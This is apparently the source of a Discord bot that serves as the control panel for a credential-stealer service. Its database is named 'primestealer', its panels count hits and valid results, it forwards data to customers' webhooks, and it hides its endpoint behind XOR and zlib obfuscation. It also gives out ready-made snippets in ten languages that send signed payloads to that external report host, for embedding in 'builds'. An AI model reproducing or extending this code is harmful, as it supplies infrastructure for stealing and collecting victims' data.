# language: Python 3.11+, file: bot_main.py
# deps: pip install discord.py motor python-dotenv
# env: BOT_TOKEN, MONGO_URI

import os, json, base64, hashlib, hmac, zlib, secrets, re
from datetime import datetime, timezone
import discord
from discord import app_commands
from discord.ext import tasks
import motor.motor_asyncio
from dotenv import load_dotenv

load_dotenv()

# ── CONFIG ────────────────────────────────────────────────────
BOT_TOKEN  = os.environ["BOT_TOKEN"]
MONGO_URI  = os.environ["MONGO_URI"]
APP_LIMIT  = 5

_SK_A = bytes([80,114,105,109,101])
_SK_B = bytes([84,97,108,104,97])
_SK_C = bytes([159,60,122,17,222,188,68,2,248,145,86,35,170,120,205,239])

def _get_sk() -> bytes:
    base = _SK_A + _SK_B + _SK_C
    h = hashlib.sha256(_SK_A + _SK_C).digest()[:4]
    return bytes(a ^ b for a, b in zip(base[:4], h)) + base[4:]

def _dec(blob: str) -> str:
    sk  = _get_sk()
    raw = base64.b85decode(blob.encode())
    key = sk * (len(raw) // len(sk) + 1)
    return zlib.decompress(bytes(a ^ b for a, b in zip(raw, key))).decode()

_EP_ENC = 'D5#=EOnph(y0)+qGh7n&Y0%TTobTsVgd>?cy++CYv!|rCuy$A3@s>pb!3tSc'
API_ENDPOINT = _dec(_EP_ENC)

# ── MONGO ─────────────────────────────────────────────────────
mongo   = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
db      = mongo["primestealer"]
apps    = db["apps"]
panels  = db["panels"]

# ── HELPERS ───────────────────────────────────────────────────
def mono(s: str) -> str:
    out = []
    for c in s:
        if   'A' <= c <= 'Z': out.append(chr(0x1D670 + ord(c) - 65))
        elif 'a' <= c <= 'z': out.append(chr(0x1D68A + ord(c) - 97))
        elif '0' <= c <= '9': out.append(chr(0x1D7F6 + ord(c) - 48))
        else: out.append(c)
    return ''.join(out)

SEP   = "○ . ⌣⌣⌣ . ཻུ꧂ . ⌣⌣⌣ . ○"

def mask_webhook(url: str) -> str:
    # show only first ~40 chars
    if len(url) > 40:
        return url[:40] + "••••"
    return url

def new_secret() -> str:
    return secrets.token_hex(32)

def new_app_id() -> str:
    import uuid
    return str(uuid.uuid4())

def ts_now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S UTC")

# ── PANEL CONTENT ─────────────────────────────────────────────
def panel_text(app: dict) -> str:
    name    = app.get("name", "—")
    app_id  = app.get("app_id", "—")
    hits    = app.get("hits", 0)
    valid   = app.get("valid", 0)
    alerts  = app.get("alerts", 0)
    status  = "active" if app.get("active", True) else "inactive"
    webhook = mask_webhook(app.get("webhook", "—"))
    ts      = ts_now()

    return (
        f"**. 花 . ᕫᴣ、{mono(name)} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"⌇  . {mono('App ID')}   ⌇  {app_id}\n"
        f"✦  . {mono('Hits')}     ⌇  {hits}\n"
        f"⊕  . {mono('Valid')}    ⌇  {valid}\n"
        f"⊘  . {mono('Alerts')}   ⌇  {alerts}\n"
        f"ᯓ★ . {mono('Status')}   ⌇  {status}\n"
        f"⌇  . {mono('Webhook')}  ⌇  {webhook}\n\n"
        f"-# ⌇ {mono('last updated')} . {ts}"
    )

# ── PANEL BUTTONS ─────────────────────────────────────────────
class PanelView(discord.ui.View):
    def __init__(self, app_id: str, user_id: int):
        super().__init__(timeout=None)
        aid = app_id
        uid = str(user_id)

        self.add_item(PanelBtn("◈  Credentials", f"cred:{aid}:{uid}",  discord.ButtonStyle.secondary))
        self.add_item(PanelBtn("⊹  Integration",  f"intg:{aid}:{uid}",  discord.ButtonStyle.secondary))
        self.add_item(PanelBtn("↻  Rotate",        f"rot:{aid}:{uid}",   discord.ButtonStyle.secondary))
        self.add_item(PanelBtn("✎  Rename",         f"ren:{aid}:{uid}",   discord.ButtonStyle.secondary))
        self.add_item(PanelBtn("✕  Delete",          f"del:{aid}:{uid}",   discord.ButtonStyle.danger))
        self.add_item(PanelBtn("⌇  Webhook",         f"wh:{aid}:{uid}",    discord.ButtonStyle.secondary))

class PanelBtn(discord.ui.Button):
    def __init__(self, label, custom_id, style):
        super().__init__(label=label, custom_id=custom_id, style=style)

# ── INTEGRATION LANGUAGE SELECT ───────────────────────────────
LANGUAGES = ["Python", "C#", "C++", "Go", "Rust", "Java", "NodeJS", "PHP", "Ruby", "VB.NET"]

LANG_CODE = {
    "Python": (
        "python",
        """import hmac, hashlib, json, requests

APP_ID = "YOUR_APP_ID"
SECRET = "YOUR_SECRET"

def send(payload: dict):
    body = json.dumps(payload).encode()
    sig  = hmac.new(SECRET.encode(), body, hashlib.sha256).hexdigest()
    requests.post(
        "https://api.primetalha.qzz.io/report",
        data=body,
        headers={
            "Content-Type": "application/json",
            "X-App-ID":     APP_ID,
            "X-Sig":        sig,
        },
        timeout=15,
    )"""
    ),
    "C#": (
        "csharp",
        """using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

const string APP_ID   = "YOUR_APP_ID";
const string SECRET   = "YOUR_SECRET";
const string ENDPOINT = "https://api.primetalha.qzz.io/report";

static string Sign(byte[] body) {
    var key = Encoding.UTF8.GetBytes(SECRET);
    using var h = new HMACSHA256(key);
    return Convert.ToHexString(h.ComputeHash(body)).ToLower();
}

static async Task Send(object payload) {
    var body    = JsonSerializer.SerializeToUtf8Bytes(payload);
    var content = new ByteArrayContent(body);
    content.Headers.Add("Content-Type", "application/json");
    content.Headers.Add("X-App-ID",     APP_ID);
    content.Headers.Add("X-Sig",        Sign(body));
    using var http = new HttpClient();
    await http.PostAsync(ENDPOINT, content);
}"""
    ),
    "C++": (
        "cpp",
        """// deps: libcurl, openssl
#include <curl/curl.h>
#include <openssl/hmac.h>
#include <string>

const std::string APP_ID   = "YOUR_APP_ID";
const std::string SECRET   = "YOUR_SECRET";
const std::string ENDPOINT = "https://api.primetalha.qzz.io/report";

std::string sign(const std::string& body) {
    unsigned char out[32]; unsigned int len = 32;
    HMAC(EVP_sha256(),
         SECRET.data(), SECRET.size(),
         (unsigned char*)body.data(), body.size(),
         out, &len);
    char hex[65];
    for (int i = 0; i < 32; i++) sprintf(hex + i*2, "%02x", out[i]);
    return std::string(hex, 64);
}

void send_report(const std::string& json_body) {
    CURL* c = curl_easy_init();
    std::string sig = sign(json_body);
    struct curl_slist* h = nullptr;
    h = curl_slist_append(h, "Content-Type: application/json");
    h = curl_slist_append(h, ("X-App-ID: " + APP_ID).c_str());
    h = curl_slist_append(h, ("X-Sig: " + sig).c_str());
    curl_easy_setopt(c, CURLOPT_URL, ENDPOINT.c_str());
    curl_easy_setopt(c, CURLOPT_HTTPHEADER, h);
    curl_easy_setopt(c, CURLOPT_POSTFIELDS, json_body.c_str());
    curl_easy_perform(c);
    curl_easy_cleanup(c);
}"""
    ),
    "Go": (
        "go",
        """package main

import (
    "bytes"; "crypto/hmac"; "crypto/sha256"
    "encoding/hex"; "net/http"
)

const appID   = "YOUR_APP_ID"
const secret  = "YOUR_SECRET"
const endpoint = "https://api.primetalha.qzz.io/report"

func sign(body []byte) string {
    mac := hmac.New(sha256.New, []byte(secret))
    mac.Write(body)
    return hex.EncodeToString(mac.Sum(nil))
}

func send(body []byte) {
    req, _ := http.NewRequest("POST", endpoint, bytes.NewReader(body))
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-App-ID",     appID)
    req.Header.Set("X-Sig",        sign(body))
    http.DefaultClient.Do(req)
}"""
    ),
    "Rust": (
        "rust",
        """// Cargo.toml: reqwest = {features=["blocking"]}, hmac, sha2, hex
use hmac::{Hmac, Mac};
use sha2::Sha256;

const APP_ID:   &str = "YOUR_APP_ID";
const SECRET:   &str = "YOUR_SECRET";
const ENDPOINT: &str = "https://api.primetalha.qzz.io/report";

fn sign(body: &[u8]) -> String {
    let mut mac = Hmac::<Sha256>::new_from_slice(SECRET.as_bytes()).unwrap();
    mac.update(body);
    hex::encode(mac.finalize().into_bytes())
}

fn send(body: &str) {
    let sig = sign(body.as_bytes());
    reqwest::blocking::Client::new()
        .post(ENDPOINT)
        .header("Content-Type", "application/json")
        .header("X-App-ID",     APP_ID)
        .header("X-Sig",        sig)
        .body(body.to_string())
        .send().ok();
}"""
    ),
    "Java": (
        "java",
        """import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.net.http.*;
import java.net.URI;

public class Sender {
    static final String APP_ID   = "YOUR_APP_ID";
    static final String SECRET   = "YOUR_SECRET";
    static final String ENDPOINT = "https://api.primetalha.qzz.io/report";

    static String sign(byte[] body) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(SECRET.getBytes(), "HmacSHA256"));
        byte[] h = mac.doFinal(body);
        StringBuilder sb = new StringBuilder();
        for (byte b : h) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    static void send(String json) throws Exception {
        byte[] body = json.getBytes();
        HttpClient.newHttpClient().send(
            HttpRequest.newBuilder(URI.create(ENDPOINT))
                .header("Content-Type", "application/json")
                .header("X-App-ID",     APP_ID)
                .header("X-Sig",        sign(body))
                .POST(HttpRequest.BodyPublishers.ofByteArray(body))
                .build(),
            HttpResponse.BodyHandlers.discarding());
    }
}"""
    ),
    "NodeJS": (
        "javascript",
        """const crypto = require('crypto');
const https  = require('https');

const APP_ID   = 'YOUR_APP_ID';
const SECRET   = 'YOUR_SECRET';
const ENDPOINT = 'https://api.primetalha.qzz.io/report';

function sign(body) {
    return crypto.createHmac('sha256', SECRET).update(body).digest('hex');
}

function send(payload) {
    const body = JSON.stringify(payload);
    const sig  = sign(body);
    const url  = new URL(ENDPOINT);
    const req  = https.request({
        hostname: url.hostname, path: url.pathname, method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-App-ID':     APP_ID,
            'X-Sig':        sig,
        }
    });
    req.write(body); req.end();
}"""
    ),
    "PHP": (
        "php",
        """<?php
const APP_ID   = 'YOUR_APP_ID';
const SECRET   = 'YOUR_SECRET';
const ENDPOINT = 'https://api.primetalha.qzz.io/report';

function send(array $payload): void {
    $body = json_encode($payload);
    $sig  = hash_hmac('sha256', $body, SECRET);
    $ctx  = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => implode("\\r\\n", [
            'Content-Type: application/json',
            'X-App-ID: ' . APP_ID,
            'X-Sig: '    . $sig,
        ]),
        'content' => $body,
    ]]);
    file_get_contents(ENDPOINT, false, $ctx);
}"""
    ),
    "Ruby": (
        "ruby",
        """require 'net/http'
require 'openssl'
require 'json'
require 'uri'

APP_ID   = 'YOUR_APP_ID'
SECRET   = 'YOUR_SECRET'
ENDPOINT = URI('https://api.primetalha.qzz.io/report')

def sign(body)
  OpenSSL::HMAC.hexdigest('SHA256', SECRET, body)
end

def send_report(payload)
  body = payload.to_json
  req  = Net::HTTP::Post.new(ENDPOINT)
  req['Content-Type'] = 'application/json'
  req['X-App-ID']     = APP_ID
  req['X-Sig']        = sign(body)
  req.body = body
  Net::HTTP.start(ENDPOINT.host, ENDPOINT.port, use_ssl: true) { |h| h.request(req) }
end"""
    ),
    "VB.NET": (
        "vbnet",
        """Imports System.Net.Http
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.Json

Module Sender
    Const APP_ID   As String = "YOUR_APP_ID"
    Const SECRET   As String = "YOUR_SECRET"
    Const ENDPOINT As String = "https://api.primetalha.qzz.io/report"

    Function Sign(body As Byte()) As String
        Dim key  = Encoding.UTF8.GetBytes(SECRET)
        Using h  = New HMACSHA256(key)
            Return Convert.ToHexString(h.ComputeHash(body)).ToLower()
        End Using
    End Function

    Async Function Send(payload As Object) As Task
        Dim body    = JsonSerializer.SerializeToUtf8Bytes(payload)
        Dim content = New ByteArrayContent(body)
        content.Headers.Add("Content-Type", "application/json")
        content.Headers.Add("X-App-ID",     APP_ID)
        content.Headers.Add("X-Sig",        Sign(body))
        Using http = New HttpClient()
            Await http.PostAsync(ENDPOINT, content)
        End Using
    End Function
End Module"""
    ),
}

def integration_text(lang: str, app: dict) -> str:
    app_id  = app.get("app_id", "YOUR_APP_ID")
    secret  = app.get("secret", "YOUR_SECRET")
    tag, code = LANG_CODE.get(lang, ("text", "# not found"))
    code = code.replace("YOUR_APP_ID", app_id).replace("YOUR_SECRET", secret)
    return (
        f"**. 花 . ᕫᴣ、{mono('Integration')} — {mono(lang)} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"```{tag}\n{code}\n```\n\n"
        f"-# ⌇ {mono('endpoint')} . https://api.primetalha.qzz.io/report\n"
        f"-# ⌇ only you can see this"
    )

class IntegrationSelect(discord.ui.Select):
    def __init__(self, app_id: str, user_id: int):
        self._app_id  = app_id
        self._user_id = user_id
        opts = [discord.SelectOption(label=l, value=l) for l in LANGUAGES]
        super().__init__(placeholder="Select language…", options=opts,
                         custom_id=f"intsel:{app_id}:{user_id}")

    async def callback(self, itr: discord.Interaction):
        if itr.user.id != self._user_id:
            await itr.response.send_message("not your panel.", ephemeral=True); return
        lang   = self.values[0]
        app    = await apps.find_one({"app_id": self._app_id, "owner": str(self._user_id)})
        if not app:
            await itr.response.send_message("app not found.", ephemeral=True); return
        body = integration_text(lang, app)
        await itr.response.send_message(body, ephemeral=True)

class IntegrationView(discord.ui.View):
    def __init__(self, app_id: str, user_id: int):
        super().__init__(timeout=120)
        self.add_item(IntegrationSelect(app_id, user_id))

# ── RENAME MODAL ──────────────────────────────────────────────
class RenameModal(discord.ui.Modal, title="Rename App"):
    new_name = discord.ui.TextInput(label="New Name", min_length=1, max_length=32)

    def __init__(self, app_id: str, msg_id: int, channel_id: int):
        super().__init__()
        self._app_id     = app_id
        self._msg_id     = msg_id
        self._channel_id = channel_id

    async def on_submit(self, itr: discord.Interaction):
        name = self.new_name.value.strip()
        await apps.update_one({"app_id": self._app_id}, {"$set": {"name": name}})
        app = await apps.find_one({"app_id": self._app_id})
        await update_panel_msg(itr.client, self._app_id, self._msg_id, self._channel_id, app, itr.user.id)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Renamed')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"ᯓ★ . {mono('App')} ⌇ {name}\n\n"
            f"-# ⌇ only you can see this",
            ephemeral=True)

# ── WEBHOOK MODAL ─────────────────────────────────────────────
class WebhookModal(discord.ui.Modal, title="Set Webhook"):
    url = discord.ui.TextInput(label="Discord Webhook URL", min_length=10, max_length=200)

    def __init__(self, app_id: str, msg_id: int, channel_id: int):
        super().__init__()
        self._app_id     = app_id
        self._msg_id     = msg_id
        self._channel_id = channel_id

    async def on_submit(self, itr: discord.Interaction):
        wh = self.url.value.strip()
        await apps.update_one({"app_id": self._app_id}, {"$set": {"webhook": wh}})
        app = await apps.find_one({"app_id": self._app_id})
        await update_panel_msg(itr.client, self._app_id, self._msg_id, self._channel_id, app, itr.user.id)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Webhook Updated')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⌇ . {mono('New Webhook')} ⌇ {mask_webhook(wh)}\n\n"
            f"-# ⌇ only you can see this",
            ephemeral=True)

# ── PANEL UPDATE HELPER ───────────────────────────────────────
async def update_panel_msg(bot, app_id: str, msg_id: int, channel_id: int, app: dict, user_id: int):
    try:
        ch  = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
        msg = await ch.fetch_message(msg_id)
        view = PanelView(app_id, user_id)
        payload = {
            "flags": 1 << 15,
            "components": [
                {"type": 17, "accent_color": 0x6C63FF, "components": [
                    {"type": 10, "content": panel_text(app)}
                ]},
                {"type": 14, "spacing": "large", "divider": True},
            ] + _button_rows(view)
        }
        await msg.edit(content=None, view=view)
    except: pass

def _button_rows(view: discord.ui.View) -> list:
    # v2 doesn't need explicit action rows for view — discord.py handles it
    return []

# ── BOT SETUP ─────────────────────────────────────────────────
intents = discord.Intents.default()
bot     = discord.Client(intents=intents)
tree    = app_commands.CommandTree(bot)

@bot.event
async def on_ready():
    await tree.sync()
    refresh_panels.start()
    print(f"online — {bot.user}")

# ── AUTO REFRESH PANELS ───────────────────────────────────────
@tasks.loop(seconds=30)
async def refresh_panels():
    async for panel in panels.find({}):
        try:
            app = await apps.find_one({"app_id": panel["app_id"]})
            if not app: continue
            ch  = bot.get_channel(panel["channel_id"]) or \
                  await bot.fetch_channel(panel["channel_id"])
            msg = await ch.fetch_message(panel["msg_id"])
            view = PanelView(panel["app_id"], panel["user_id"])
            await msg.edit(content=panel_text(app), view=view)
        except: pass

# ── /app create ───────────────────────────────────────────────
class CreateModal(discord.ui.Modal, title="Create App"):
    name    = discord.ui.TextInput(label="App Name",          min_length=1, max_length=32)
    webhook = discord.ui.TextInput(label="Discord Webhook URL", min_length=10, max_length=200)

    async def on_submit(self, itr: discord.Interaction):
        uid   = str(itr.user.id)
        count = await apps.count_documents({"owner": uid})
        if count >= APP_LIMIT:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('Limit Reached')} . ≧。 . ıl**\n\n"
                f"{SEP}\n\n"
                f"⊘ . {mono('Max apps')} ⌇ {APP_LIMIT}\n\n"
                f"-# ⌇ only you can see this",
                ephemeral=True); return

        app_id = new_app_id()
        secret = new_secret()
        await apps.insert_one({
            "app_id":  app_id,
            "owner":   uid,
            "name":    self.name.value.strip(),
            "webhook": self.webhook.value.strip(),
            "secret":  secret,
            "active":  True,
            "hits":    0,
            "valid":   0,
            "alerts":  0,
        })
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('App Created')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"ᯓ★ . {mono('Name')}    ⌇ {self.name.value.strip()}\n"
            f"⌇  . {mono('App ID')}  ⌇ {app_id}\n"
            f"◈  . {mono('Secret')}  ⌇ ||{secret}||\n\n"
            f""
            f"-# ⌇ only you can see this",
            ephemeral=True)

@tree.command(name="app", description="Manage your apps")
@app_commands.describe(action="create or manage")
@app_commands.choices(action=[
    app_commands.Choice(name="create",  value="create"),
    app_commands.Choice(name="manage",  value="manage"),
])
async def app_cmd(itr: discord.Interaction, action: str):
    if action == "create":
        await itr.response.send_modal(CreateModal())
    else:
        uid       = str(itr.user.id)
        user_apps = await apps.find({"owner": uid}).to_list(length=APP_LIMIT)
        if not user_apps:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('No Apps')} . ≧。 . ıl**\n\n"
                f"{SEP}\n\n"
                f"⊘ . no apps yet — use `/app create`\n\n"
                f"-# ⌇ only you can see this",
                ephemeral=True); return

        opts = [discord.SelectOption(label=a["name"], value=a["app_id"]) for a in user_apps]
        view = discord.ui.View(timeout=120)

        sel = discord.ui.Select(placeholder="Select an app…", options=opts)

        async def sel_cb(sel_itr: discord.Interaction):
            aid = sel.values[0]
            app = await apps.find_one({"app_id": aid, "owner": uid})
            if not app:
                await sel_itr.response.send_message("app not found.", ephemeral=True); return

            pview = PanelView(aid, sel_itr.user.id)

            # send panel as v2 component message
            await sel_itr.response.send_message(
                panel_text(app),
                view=pview,
                ephemeral=False
            )

            # get sent message to track for auto-refresh
            msg = await sel_itr.original_response()
            await panels.update_one(
                {"app_id": aid, "user_id": sel_itr.user.id},
                {"$set": {
                    "app_id":     aid,
                    "user_id":    sel_itr.user.id,
                    "msg_id":     msg.id,
                    "channel_id": msg.channel.id,
                }},
                upsert=True
            )

        sel.callback = sel_cb
        view.add_item(sel)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Apps')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"◈ . {mono('Total')} ⌇ {len(user_apps)}/{APP_LIMIT}",
            view=view, ephemeral=True)

# ── BUTTON HANDLER ────────────────────────────────────────────
@bot.event
async def on_interaction(itr: discord.Interaction):
    if itr.type != discord.InteractionType.component: return

    cid = itr.data.get("custom_id", "")
    if ":" not in cid: return

    parts   = cid.split(":")
    action  = parts[0]
    app_id  = parts[1]
    owner   = int(parts[2])

    if itr.user.id != owner:
        await itr.response.send_message("not your panel.", ephemeral=True); return

    app = await apps.find_one({"app_id": app_id, "owner": str(owner)})
    if not app:
        await itr.response.send_message("app not found.", ephemeral=True); return

    panel = await panels.find_one({"app_id": app_id, "user_id": owner})
    msg_id     = panel["msg_id"]     if panel else 0
    channel_id = panel["channel_id"] if panel else 0

    # ── CREDENTIALS ──────────────────────────────────────────
    if action == "cred":
        body = (
            f"**. 花 . ᕫᴣ、{mono('Credentials')} — {mono(app['name'])} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⌇  . {mono('Endpoint')} ⌇ https://api.primetalha.qzz.io/report\n"
            f"◈  . {mono('App ID')}   ⌇ ||{app['app_id']}||\n"
            f"✦  . {mono('Secret')}   ⌇ ||{app['secret']}||\n\n"
            f"-# ⌇ only you can see this"
        )
        await itr.response.send_message(body, ephemeral=True)

    # ── INTEGRATION ───────────────────────────────────────────
    elif action == "intg":
        body = (
            f"**. 花 . ᕫᴣ、{mono('Integration Guide')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⊹ . select a language"
        )
        await itr.response.send_message(body,
            view=IntegrationView(app_id, owner), ephemeral=True)

    # ── ROTATE CONFIRM ────────────────────────────────────────
    elif action == "rot":
        confirm_view = discord.ui.View(timeout=60)

        yes = discord.ui.Button(label="✓  Confirm Rotate", style=discord.ButtonStyle.danger,
                                custom_id=f"rotc:{app_id}:{owner}")
        no  = discord.ui.Button(label="✕  Cancel",          style=discord.ButtonStyle.secondary,
                                custom_id=f"rotx:{app_id}:{owner}")

        async def yes_cb(y_itr: discord.Interaction):
            if y_itr.user.id != owner:
                await y_itr.response.send_message("not yours.", ephemeral=True); return
            sec = new_secret()
            await apps.update_one({"app_id": app_id}, {"$set": {"secret": sec}})
            updated = await apps.find_one({"app_id": app_id})
            await update_panel_msg(bot, app_id, msg_id, channel_id, updated, owner)
            await y_itr.response.edit_message(
                content=(
                    f"**. 花 . ᕫᴣ、{mono('Secret Rotated')} . ≧。 . ıl**\n\n"
                    f"{SEP}\n\n"
                    f"↻ . {mono('New Secret')} ⌇ ||{sec}||\n\n"
                    f"-# ⌇ old builds are now dead\n"
                    f"-# ⌇ only you can see this"
                ), view=None)

        async def no_cb(n_itr: discord.Interaction):
            await n_itr.response.edit_message(content="-# cancelled", view=None)

        yes.callback = yes_cb
        no.callback  = no_cb
        confirm_view.add_item(yes)
        confirm_view.add_item(no)

        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Rotate Secret')} — {mono(app['name'])} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⚠ . existing builds will stop working\n"
            f"⚠ . rebuild with new secret required\n\n"
            f"⌇ . {mono('Webhook')} ⌇ preserved\n\n"
            f"-# ⌇ only you can see this",
            view=confirm_view, ephemeral=True)

    # ── RENAME ────────────────────────────────────────────────
    elif action == "ren":
        await itr.response.send_modal(RenameModal(app_id, msg_id, channel_id))

    # ── DELETE CONFIRM ────────────────────────────────────────
    elif action == "del":
        confirm_view = discord.ui.View(timeout=60)

        yes = discord.ui.Button(label="✓  Confirm Delete", style=discord.ButtonStyle.danger,
                                custom_id=f"delc:{app_id}:{owner}")
        no  = discord.ui.Button(label="✕  Cancel",          style=discord.ButtonStyle.secondary,
                                custom_id=f"delx:{app_id}:{owner}")

        async def yes_cb(y_itr: discord.Interaction):
            if y_itr.user.id != owner:
                await y_itr.response.send_message("not yours.", ephemeral=True); return
            await apps.delete_one({"app_id": app_id})
            await panels.delete_one({"app_id": app_id, "user_id": owner})
            await y_itr.response.edit_message(
                content=(
                    f"**. 花 . ᕫᴣ、{mono('Deleted')} . ≧。 . ıl**\n\n"
                    f"{SEP}\n\n"
                    f"✕ . {mono(app['name'])} ⌇ removed\n\n"
                    f"-# ⌇ only you can see this"
                ), view=None)

        async def no_cb(n_itr: discord.Interaction):
            await n_itr.response.edit_message(content="-# cancelled", view=None)

        yes.callback = yes_cb
        no.callback  = no_cb
        confirm_view.add_item(yes)
        confirm_view.add_item(no)

        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Delete')} — {mono(app['name'])} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⚠ . all logs will be removed\n"
            f"⚠ . this action is irreversible\n\n"
            f"-# ⌇ only you can see this",
            view=confirm_view, ephemeral=True)

    # ── WEBHOOK ───────────────────────────────────────────────
    elif action == "wh":
        current = app.get("webhook", "—")
        wh_view = discord.ui.View(timeout=60)

        set_btn = discord.ui.Button(label="✎  Set New Webhook",
                                    style=discord.ButtonStyle.secondary)
        async def set_cb(w_itr: discord.Interaction):
            await w_itr.response.send_modal(WebhookModal(app_id, msg_id, channel_id))

        set_btn.callback = set_cb
        wh_view.add_item(set_btn)

        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Webhook')} — {mono(app['name'])} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"◈ . {mono('Current')} ⌇ {mask_webhook(current)}\n\n"
            f"-# ⌇ only you can see this",
            view=wh_view, ephemeral=True)

bot.run(BOT_TOKEN)
